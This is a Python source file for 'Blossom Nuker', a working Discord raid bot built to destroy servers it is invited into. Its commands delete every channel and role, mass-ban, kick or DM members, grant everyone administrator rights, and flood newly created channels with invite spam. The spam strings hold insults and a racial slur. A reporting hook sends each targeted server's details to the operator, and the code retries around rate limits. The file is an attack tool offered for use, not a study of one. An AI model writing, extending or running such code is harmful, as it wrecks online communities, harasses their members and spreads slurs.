import discord
from discord.ext import commands
import asyncio
import random
import time
import aiohttp
import os
from collections import deque
from dotenv import load_dotenv
from colorama import Fore, init

init(autoreset=True)
load_dotenv()

TOKEN = os.getenv("DISCORD_TOKEN")

if not TOKEN:
    print(f"{Fore.RED}[ERROR] No DISCORD_TOKEN found in .env file!")
    exit(1)

# ============================================================
#  INTENTS
# ============================================================
intents = discord.Intents.all()
intents.message_content = True
intents.members = True
intents.guilds = True
intents.guild_messages = True

client = commands.Bot(command_prefix=";", intents=intents, help_command=None)

# ============================================================
#  CONFIGURATION
# ============================================================
REPORT_CHANNEL_ID = 1516330515110559765
INVITE_TEXT = "discord.gg/Gx9b3AsJR3"
SPAM_MESSAGE = f"@everyone {INVITE_TEXT} owns ur server pussy"
OWNER_ID = 1446215395358015559
whitelisted_servers = set()

# ============================================================
#  RATE LIMIT TRACKER
# ============================================================
class RateLimiter:
    def __init__(self, max_requests_per_second=15):
        self.max_requests = max_requests_per_second
        self.timestamps = deque(maxlen=max_requests_per_second * 2)
        self.lock = asyncio.Lock()
    
    async def wait_if_needed(self):
        async with self.lock:
            now = time.time()
            while self.timestamps and now - self.timestamps[0] > 1.0:
                self.timestamps.popleft()
            
            if len(self.timestamps) >= self.max_requests:
                oldest = self.timestamps[0]
                wait_time = 1.0 - (now - oldest) + 0.1
                if wait_time > 0:
                    await asyncio.sleep(wait_time)
            
            self.timestamps.append(time.time())

rate_limiter = RateLimiter(max_requests_per_second=15)

# ============================================================
#  ULTRA FAST CHANNEL CREATION
# ============================================================
async def create_channels_fast(guild, count=80, name="Fucked By blossom."):
    channels = []
    created = 0
    failed = 0
    
    batch_size = 8
    delay_between_batches = 0.6
    
    for i in range(0, count, batch_size):
        batch_count = min(batch_size, count - i)
        tasks = []
        
        for j in range(batch_count):
            task = asyncio.create_task(guild.create_text_channel(name))
            tasks.append(task)
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for r in results:
            if isinstance(r, discord.TextChannel):
                channels.append(r)
                created += 1
            elif isinstance(r, discord.errors.HTTPException) and r.status == 429:
                retry_after = float(r.response.headers.get('Retry-After', 2))
                print(f"[RATE LIMIT] Waiting {retry_after}s...")
                await asyncio.sleep(retry_after + 0.5)
                for j in range(batch_count):
                    try:
                        ch = await guild.create_text_channel(name)
                        channels.append(ch)
                        created += 1
                    except:
                        failed += 1
            elif isinstance(r, Exception):
                failed += 1
                print(f"[ERROR] {r}")
        
        print(f"[CREATE] Created {created}/{count} channels")
        
        if i + batch_count < count:
            await asyncio.sleep(delay_between_batches)
    
    print(f"[CREATE] Done: {created} created, {failed} failed")
    return channels

# ============================================================
#  ULTRA FAST SPAM
# ============================================================
async def spam_channel_fast(channel, message, amount):
    if not channel.permissions_for(channel.guild.me).send_messages:
        return 0
    
    sent = 0
    batch_size = 5
    
    for i in range(0, min(amount, 200), batch_size):
        batch_count = min(batch_size, amount - i)
        tasks = []
        
        for j in range(batch_count):
            task = asyncio.create_task(channel.send(message))
            tasks.append(task)
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for r in results:
            if isinstance(r, discord.Message):
                sent += 1
            elif isinstance(r, discord.errors.HTTPException) and r.status == 429:
                retry_after = float(r.response.headers.get('Retry-After', 1))
                await asyncio.sleep(retry_after + 0.3)
                try:
                    await channel.send(message)
                    sent += 1
                except:
                    pass
        
        await asyncio.sleep(0.05)
    
    return sent

async def send_invite_spam(channels, amount=30):
    if not channels:
        return 0
    
    total_sent = 0
    tasks = []
    
    for channel in channels:
        task = asyncio.create_task(spam_channel_fast(channel, SPAM_MESSAGE, amount))
        tasks.append(task)
    
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    for r in results:
        if isinstance(r, int):
            total_sent += r
    
    print(f"[SPAM] Total sent: {total_sent} messages")
    return total_sent

# ============================================================
#  BOT EVENTS
# ============================================================
@client.event
async def on_ready():
    print(f"{Fore.MAGENTA}██╗      ██████╗ ██╗   ██╗███████╗██╗      █████╗  ██████╗███████╗")
    print(f"{Fore.MAGENTA}██║     ██╔═══██╗██║   ██║██╔════╝██║     ██╔══██╗██╔════╝██╔════╝")
    print(f"{Fore.MAGENTA}██║     ██║   ██║██║   ██║█████╗  ██║     ███████║██║     █████╗")
    print(f"{Fore.MAGENTA}██║     ██║   ██║╚██╗ ██╔╝██╔══╝  ██║     ██╔══██║██║     ██╔══╝")
    print(f"{Fore.MAGENTA}███████╗╚██████╔╝ ╚████╔╝ ███████╗███████╗██║  ██║╚██████╗███████╗")
    print(f"{Fore.MAGENTA}╚══════╝ ╚═════╝   ╚═══╝  ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝")
    print(f"{Fore.MAGENTA}[1] ;hiroshima - Nukes [2]       |       [2] ;help - Displays This")
    print(f"{Fore.MAGENTA}[3] ;blame @user - Accuses someone | [4] ;kicka - Kicks all bots")
    print(f"{Fore.MAGENTA}------------------------------------------------------------------")
    print(f"{Fore.MAGENTA}[5] ;credits - Shows My Socials | [6] ;nothing - nothing left")
    print(f"{Fore.GREEN}[+] Bot is ready! Logged in as {client.user}")
    print(f"{Fore.GREEN}[+] Guilds: {len(client.guilds)}")
    print(f"{Fore.GREEN}[+] Commands loaded: {len(client.commands)}")

@client.before_invoke
async def before_invoke(ctx):
    if ctx.guild and ctx.guild.id in whitelisted_servers and ctx.command.name in ("hiroshima", "nothing"):
        await ctx.send("server whitelisted. :3")
        raise commands.CheckFailure()

# ============================================================
#  EXISTING COMMANDS
# ============================================================
@client.command(name="hiroshima")
async def hiroshima(ctx):
    if not ctx.guild:
        await ctx.send("This command only works in a server.")
        return
    
    if not ctx.guild.me.guild_permissions.administrator:
        await ctx.send("I need Administrator permissions to nuke!")
        return
    
    await ctx.send("**FUCKED BY BLOSSOM POOR ASS NIGGA https://discord.gg/bqy92JmPY**")
    guild = ctx.guild
    print(f"[START] Hiroshima on {guild.name} ({guild.id}) by {ctx.author}")

    try:
        if ctx.guild.me.guild_permissions.manage_guild:
            await guild.edit(name="fuck you blossom owns")
            print(f"[SUCCESS] Server name changed")
            
            icon_url = "https://cdn.discordapp.com/attachments/1516425080865820743/1517713469682487416/pfp.png?ex=6a374850&is=6a35f6d0&hm=b4f447f0e4dd2897798483ade19dfa3b7fc18fb190606b202d9e163be489fc8c&"
            async with aiohttp.ClientSession() as session:
                async with session.get(icon_url, timeout=10) as resp:
                    if resp.status == 200:
                        image_data = await resp.read()
                        await guild.edit(icon=image_data)
                        print("[SUCCESS] Server icon changed")
        else:
            print("[ERROR] Missing manage_guild permission")
    except Exception as e:
        print(f"[ERROR] Server rename/icon: {e}")

    try:
        report_channel = client.get_channel(REPORT_CHANNEL_ID)
        if report_channel:
            embed = discord.Embed(
                title="Hiroshima command used",
                description=f"A server has been targeted.",
                color=discord.Color.red()
            )
            embed.add_field(name="Server name", value=guild.name, inline=False)
            embed.add_field(name="Member count", value=str(guild.member_count), inline=False)
            embed.add_field(name="Server ID", value=str(guild.id), inline=False)
            embed.add_field(name="Executor", value=f"{ctx.author} ({ctx.author.id})", inline=False)
            embed.set_footer(text="Blossom Nuker report")
            await report_channel.send(embed=embed)
    except Exception as e:
        print(f"[ERROR] Report: {e}")

    print("[DELETE] Deleting all channels...")
    delete_tasks = []
    for channel in list(guild.channels):
        delete_tasks.append(asyncio.create_task(channel.delete()))
    
    if delete_tasks:
        await asyncio.gather(*delete_tasks, return_exceptions=True)
        print(f"[DELETE] Deleted {len(delete_tasks)} channels")

    print("[DELETE] Deleting all roles...")
    delete_tasks = []
    for role in list(guild.roles):
        if role.name != "@everyone":
            delete_tasks.append(asyncio.create_task(role.delete()))
    
    if delete_tasks:
        await asyncio.gather(*delete_tasks, return_exceptions=True)
        print(f"[DELETE] Deleted {len(delete_tasks)} roles")

    print("[CREATE] Creating 80 channels at max speed...")
    channels = await create_channels_fast(guild, count=80, name="Fucked By blossom.")

    if channels:
        print(f"[SPAM] Spamming {len(channels)} channels...")
        await send_invite_spam(channels, amount=40)
    else:
        existing = [c for c in guild.text_channels if c.permissions_for(guild.me).send_messages]
        if existing:
            print(f"[SPAM] Using {len(existing)} existing channels")
            await send_invite_spam(existing, amount=40)

    print(f"[COMPLETE] Hiroshima finished on {guild.name}")
    await ctx.send("Nuke complete. Check the carnage.")

@client.command(name="nuke")
async def nuke(ctx):
    """Alias for ;hiroshima"""
    await hiroshima(ctx)

@client.command(name="spaminvite")
async def spaminvite(ctx, amount: int = 25):
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    if amount <= 0:
        amount = 1
    channels = [channel for channel in ctx.guild.text_channels if channel.permissions_for(ctx.me).send_messages]
    if not channels:
        await ctx.send("No writable channels found.")
        return
    await ctx.send(f"Spamming...")
    await send_invite_spam(channels, amount=amount)
    await ctx.send("Finished.")

@client.command(name="kicka")
async def kicka(ctx, member: discord.Member = None):
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return

    if member is not None:
        if member == ctx.author:
            await ctx.send("You can't kick yourself.")
            return
        if member.top_role >= ctx.author.top_role and ctx.author != ctx.guild.owner:
            await ctx.send("You can't kick someone with a higher or equal role.")
            return
        try:
            await member.kick(reason=f"Kicked by {ctx.author}")
            await ctx.send(f"Kicked {member.mention}")
        except discord.Forbidden:
            await ctx.send("I don't have permission to kick that member.")
        except Exception as e:
            await ctx.send(f"Error: {e}")
        return

    if not ctx.author.guild_permissions.kick_members:
        await ctx.send("You need the Kick Members permission.")
        return

    target_bots = [m for m in ctx.guild.members if m.bot and m.id != ctx.guild.me.id]
    if not target_bots:
        await ctx.send("No bots found to kick.")
        return

    await ctx.send(f"Kicking {len(target_bots)} bot(s)...")
    kicked = 0
    failed = 0
    for m in target_bots:
        try:
            await m.kick(reason=f"Kicked by {ctx.author}")
            kicked += 1
        except Exception:
            failed += 1
    await ctx.send(f"Kicked {kicked} bot(s). {failed} failed.")

@client.command(name="blame")
async def blame(ctx, member: discord.Member = None):
    target = member or ctx.author
    reasons = ["thanks for nuking nigga!"] * 5
    reason = random.choice(reasons)
    embed = discord.Embed(
        title="Blame report",
        description=f"{target.mention} has been blamed.",
        color=discord.Color.orange()
    )
    embed.add_field(name="Accused by", value=ctx.author.mention, inline=True)
    embed.add_field(name="Reason", value=reason, inline=False)
    embed.set_footer(text="The evidence is mostly vibes.")
    await ctx.send(embed=embed)

@client.command(name="credits")
async def credits(ctx):
    await ctx.send("**Bot created by 6syj on discord**")
    await ctx.send("**Get bot here: .gg/a6PrNZDP57**")

INVITE_URL = "https://discord.com/oauth2/authorize?client_id=1515950695679787008&permissions=8&integration_type=0&scope=bot"

@client.command(name="getbot")
async def getbot(ctx):
    view = discord.ui.View()
    view.add_item(discord.ui.Button(label="Invite Bot", url=INVITE_URL, style=discord.ButtonStyle.link))
    embed = discord.Embed(
        title="Invite this bot",
        description="Click the button below to invite the bot to your server.",
        color=discord.Color.blue(),
    )
    await ctx.send(embed=embed, view=view)

@client.command(name="whitelist")
async def whitelist(ctx, action: str, guild_id: int = None):
    if ctx.author.id != OWNER_ID:
        await ctx.send("Restricted to bot owner.")
        return

    if action.lower() == "add":
        if guild_id is None:
            guild_id = ctx.guild.id
        whitelisted_servers.add(guild_id)
        await ctx.send(f"Server `{guild_id}` whitelisted.")
    elif action.lower() == "remove":
        if guild_id is None:
            guild_id = ctx.guild.id
        whitelisted_servers.discard(guild_id)
        await ctx.send(f"Server `{guild_id}` removed from whitelist.")
    elif action.lower() == "list":
        if whitelisted_servers:
            await ctx.send(f"**Whitelisted:** {', '.join(str(g) for g in whitelisted_servers)}")
        else:
            await ctx.send("**No whitelisted servers.**")
    else:
        await ctx.send("Usage: `;whitelist add [guild_id]`, `;whitelist remove [guild_id]`, or `;whitelist list`")

@client.command(name="nothing")
async def nothing(ctx):
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    
    await ctx.send("Deleting everything...")
    guild = ctx.guild
    
    for channel in list(guild.channels):
        try:
            await channel.delete()
        except:
            pass
    
    for role in list(guild.roles):
        if role.name != "@everyone":
            try:
                await role.delete()
            except:
                pass
    
    await ctx.send("Everything deleted.")

# ============================================================
#  NEW COMMANDS
# ============================================================
@client.command(name="banall")
async def banall(ctx):
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    if not ctx.author.guild_permissions.ban_members:
        await ctx.send("You need Ban Members permission.")
        return
    await ctx.send(f"Banning {len(ctx.guild.members)} members...")
    banned = 0
    failed = 0
    for member in list(ctx.guild.members):
        if member == ctx.guild.owner:
            continue
        if member == ctx.author:
            continue
        try:
            await member.ban(reason="Banall command")
            banned += 1
            await asyncio.sleep(0.2)
        except:
            failed += 1
    await ctx.send(f"Banned {banned} members. {failed} failed.")

@client.command(name="dmall")
async def dmall(ctx, *, message: str = "You have been nuked."):
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    await ctx.send(f"Dming {len(ctx.guild.members)} members...")
    sent = 0
    failed = 0
    for member in list(ctx.guild.members):
        if member.bot:
            continue
        try:
            await member.send(message)
            sent += 1
            await asyncio.sleep(0.3)
        except:
            failed += 1
    await ctx.send(f"Dmed {sent} members. {failed} failed.")

@client.command(name="roles")
async def roles(ctx, count: int = 100):
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    if count > 250:
        count = 250
    await ctx.send(f"Creating {count} roles...")
    created = 0
    failed = 0
    colors = [0xFF0000, 0x00FF00, 0x0000FF, 0xFFFF00, 0xFF00FF, 0x00FFFF]
    for i in range(count):
        try:
            color = random.choice(colors)
            await ctx.guild.create_role(name=f"role-{i}", color=color)
            created += 1
            if i % 10 == 0:
                await asyncio.sleep(0.1)
        except:
            failed += 1
    await ctx.send(f"Created {created} roles. {failed} failed.")

@client.command(name="op")
async def op(ctx, member: discord.Member = None):
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    target = member or ctx.author
    if target == ctx.guild.owner:
        await ctx.send("Cannot OP the server owner.")
        return
    try:
        admin_role = discord.utils.get(ctx.guild.roles, name="Admin")
        if not admin_role:
            admin_role = await ctx.guild.create_role(name="Admin", permissions=discord.Permissions.all())
        await target.add_roles(admin_role)
        await ctx.send(f"{target.mention} now has Administrator.")
    except:
        await ctx.send("Failed to give OP. Missing permissions.")

@client.command(name="del")
async def del_channels(ctx):
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    await ctx.send("Deleting all channels...")
    deleted = 0
    failed = 0
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
            deleted += 1
            await asyncio.sleep(0.1)
        except:
            failed += 1
    await ctx.send(f"Deleted {deleted} channels. {failed} failed.")

@client.command(name="rename")
async def rename_all(ctx, *, new_name: str = "nuked"):
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    if not ctx.author.guild_permissions.manage_nicknames:
        await ctx.send("You need Manage Nicknames permission.")
        return
    await ctx.send(f"Renaming {len(ctx.guild.members)} members to '{new_name}'...")
    renamed = 0
    failed = 0
    for member in list(ctx.guild.members):
        if member == ctx.guild.owner:
            continue
        try:
            await member.edit(nick=new_name)
            renamed += 1
            await asyncio.sleep(0.2)
        except:
            failed += 1
    await ctx.send(f"Renamed {renamed} members. {failed} failed.")

@client.command(name="kickall")
async def kickall(ctx):
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    if not ctx.author.guild_permissions.kick_members:
        await ctx.send("You need Kick Members permission.")
        return
    await ctx.send(f"Kicking {len(ctx.guild.members)} members...")
    kicked = 0
    failed = 0
    for member in list(ctx.guild.members):
        if member == ctx.guild.owner:
            continue
        if member == ctx.author:
            continue
        try:
            await member.kick(reason="Kickall command")
            kicked += 1
            await asyncio.sleep(0.2)
        except:
            failed += 1
    await ctx.send(f"Kicked {kicked} members. {failed} failed.")

@client.command(name="unbanall")
async def unbanall(ctx):
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    if not ctx.author.guild_permissions.ban_members:
        await ctx.send("You need Ban Members permission.")
        return
    await ctx.send("Unbanning all banned members...")
    unbanned = 0
    failed = 0
    try:
        bans = [entry async for entry in ctx.guild.bans()]
        for ban_entry in bans:
            try:
                await ctx.guild.unban(ban_entry.user)
                unbanned += 1
                await asyncio.sleep(0.2)
            except:
                failed += 1
    except:
        await ctx.send("Failed to fetch ban list.")
        return
    await ctx.send(f"Unbanned {unbanned} members. {failed} failed.")

@client.command(name="droles")
async def droles(ctx):
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    await ctx.send("Deleting all roles...")
    deleted = 0
    failed = 0
    for role in list(ctx.guild.roles):
        if role.name == "@everyone":
            continue
        try:
            await role.delete()
            deleted += 1
            await asyncio.sleep(0.1)
        except:
            failed += 1
    await ctx.send(f"Deleted {deleted} roles. {failed} failed.")

@client.command(name="adminall")
async def adminall(ctx):
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("You need Administrator permission.")
        return
    await ctx.send("Giving admin to all members...")
    admin_role = discord.utils.get(ctx.guild.roles, name="AdminAll")
    if not admin_role:
        admin_role = await ctx.guild.create_role(name="AdminAll", permissions=discord.Permissions.all())
    added = 0
    failed = 0
    for member in list(ctx.guild.members):
        try:
            await member.add_roles(admin_role)
            added += 1
            await asyncio.sleep(0.1)
        except:
            failed += 1
    await ctx.send(f"Gave admin to {added} members. {failed} failed.")

@client.command(name="wbspam")
async def wbspam(ctx, amount: int = 10):
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    await ctx.send(f"Creating webhooks and spamming {amount} times each...")
    total_sent = 0
    failed = 0
    for channel in ctx.guild.text_channels:
        try:
            webhook = await channel.create_webhook(name="spamhook")
            for _ in range(amount):
                try:
                    await webhook.send(SPAM_MESSAGE)
                    total_sent += 1
                    await asyncio.sleep(0.1)
                except:
                    failed += 1
            await webhook.delete()
        except:
            failed += 1
    await ctx.send(f"Sent {total_sent} webhook messages. {failed} failed.")

@client.command(name="spam")
async def spam(ctx, *, text: str = SPAM_MESSAGE):
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    channels = [c for c in ctx.guild.text_channels if c.permissions_for(ctx.me).send_messages]
    if not channels:
        await ctx.send("No writable channels.")
        return
    await ctx.send(f"Spamming '{text[:20]}...' in {len(channels)} channels.")
    sent = 0
    for channel in channels:
        try:
            await channel.send(text)
            sent += 1
            await asyncio.sleep(0.1)
        except:
            pass
    await ctx.send(f"Sent to {sent} channels.")

@client.command(name="spamchannels")
async def spamchannels(ctx, count: int = 50, *, name: str = "spammed"):
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    if count > 200:
        count = 200
    await ctx.send(f"Creating {count} text channels named '{name}'...")
    created = 0
    failed = 0
    for i in range(count):
        try:
            await ctx.guild.create_text_channel(f"{name}-{i}")
            created += 1
            if i % 5 == 0:
                await asyncio.sleep(0.1)
        except:
            failed += 1
    await ctx.send(f"Created {created} channels. {failed} failed.")

@client.command(name="spamvcs")
async def spamvcs(ctx, count: int = 30, *, name: str = "vcspam"):
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    if count > 100:
        count = 100
    await ctx.send(f"Creating {count} voice channels named '{name}'...")
    created = 0
    failed = 0
    for i in range(count):
        try:
            await ctx.guild.create_voice_channel(f"{name}-{i}")
            created += 1
            if i % 5 == 0:
                await asyncio.sleep(0.1)
        except:
            failed += 1
    await ctx.send(f"Created {created} voice channels. {failed} failed.")

@client.command(name="spamcats")
async def spamcats(ctx, count: int = 20, *, name: str = "catspam"):
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    if count > 50:
        count = 50
    await ctx.send(f"Creating {count} categories named '{name}'...")
    created = 0
    failed = 0
    for i in range(count):
        try:
            await ctx.guild.create_category(f"{name}-{i}")
            created += 1
            if i % 5 == 0:
                await asyncio.sleep(0.1)
        except:
            failed += 1
    await ctx.send(f"Created {created} categories. {failed} failed.")

# ============================================================
#  UPDATED HELP COMMAND
# ============================================================
@client.command(name="help")
async def help_command(ctx):
    embed = discord.Embed(
        title="Blossom Nuker Commands",
        description="Full command list:",
        color=discord.Color.magenta()
    )
    embed.add_field(
        name="Destruction",
        value=";banall - Ban everyone\n"
              ";nuke - Full server nuke\n"
              ";hiroshima - Full server nuke (alias)\n"
              ";kickall - Kick everyone\n"
              ";unbanall - Unban everyone\n"
              ";del - Delete all channels\n"
              ";droles - Delete all roles\n"
              ";nothing - Delete everything (no spam)",
        inline=False
    )
    embed.add_field(
        name="Permissions",
        value=";op [@user] - Give admin to yourself or user\n"
              ";adminall - Give admin to everyone",
        inline=False
    )
    embed.add_field(
        name="Spam and Creation",
        value=";spam <text> - Spam custom text in all channels\n"
              ";spaminvite [amount] - Spam invite link\n"
              ";wbspam [amount] - Webhook spam\n"
              ";spamchannels <count> [name] - Create text channels\n"
              ";spamvcs <count> [name] - Create voice channels\n"
              ";spamcats <count> [name] - Create categories\n"
              ";roles [count] - Create roles",
        inline=False
    )
    embed.add_field(
        name="User Actions",
        value=";kicka [@user] - Kick user or all bots\n"
              ";rename <name> - Rename everyone\n"
              ";dmall <message> - DM all members\n"
              ";blame @user - Accuse someone",
        inline=False
    )
    embed.add_field(
        name="Utility",
        value=";ping - Bot latency\n"
              ";status - Bot stats\n"
              ";getbot - Invite link\n"
              ";whitelist - Manage whitelist\n"
              ";credits - Bot credits",
        inline=False
    )
    embed.set_footer(text="Prefix: ;")
    await ctx.send(embed=embed)

# ============================================================
#  ERROR HANDLER
# ============================================================
@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send(f"Command not found. Use `;help` to see available commands.")
    elif isinstance(error, commands.MissingPermissions):
        await ctx.send(f"You don't have permission to use this command.")
    elif isinstance(error, commands.BotMissingPermissions):
        await ctx.send(f"I don't have permission to do that. Missing: {error.missing_permissions}")
    else:
        print(f"[ERROR] {error}")
        await ctx.send(f"An error occurred: {str(error)[:100]}")

# ============================================================
#  RUN
# ============================================================
if __name__ == "__main__":
    try:
        print(f"{Fore.GREEN}[+] Starting Blossom Nuker...")
        client.run(TOKEN)
    except discord.errors.LoginFailure:
        print(f"{Fore.RED}[ERROR] Invalid Discord token!")
    except Exception as e:
        print(f"{Fore.RED}[ERROR] {e}")
